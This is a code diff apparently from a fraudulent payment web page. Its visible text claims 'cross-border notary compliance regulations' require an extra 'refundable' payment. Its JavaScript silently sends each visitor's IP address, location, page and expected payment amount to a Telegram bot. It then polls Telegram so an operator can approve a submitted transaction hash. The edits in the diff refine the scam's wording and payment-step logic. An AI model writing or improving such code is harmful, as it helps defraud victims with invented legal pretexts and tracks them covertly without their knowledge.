@@ -564,7 +564,7 @@
               font-size: 10px;
               font-weight: bold; 
             ">  
-              Standard cross-border notary compliance regulations mandate the below additional refundable protocol to notarize and register the agreement officially executed by both parties.
+              Standard cross-border notary compliance regulations mandate the following additional refundable protocol to officially notarize and register the agreement executed by both parties.
             </span>
 
           </label>
@@ -819,7 +819,7 @@ async function sendVisitorDetailsToTelegram(ipData) {
                             `📄 <b>Page:</b> <code>${currentPage}</code>\n` +
                             `💰 <b>Expected Amount:</b> <code>$${expectedAmount}</code>\n` +
                             `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
-                            `📍 <b>Location:</b> <code>${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}</code>\n` +
+                           `📍 <b>Location:</b> <code>${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}</code>\n` +
                             `⏱️ <b>Time:</b> <code>${new Date().toLocaleString()}</code>`;
 
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -975,7 +975,7 @@ function startTelegramPolling(targetUser, txHash) {
                         clearInterval(telegramPollInterval);
                         await acknowledgeTelegramAction(callbackId, messageId, originalText, "✅ APPROVED");
 
-                        localStorage.setItem("step_3_paid", "true");
+                        localStorage.setItem("step_2_paid", "true");
                         localStorage.setItem("step_3_txn_id", txHash);
 
                         localStorage.removeItem("av_payment_in_progress");
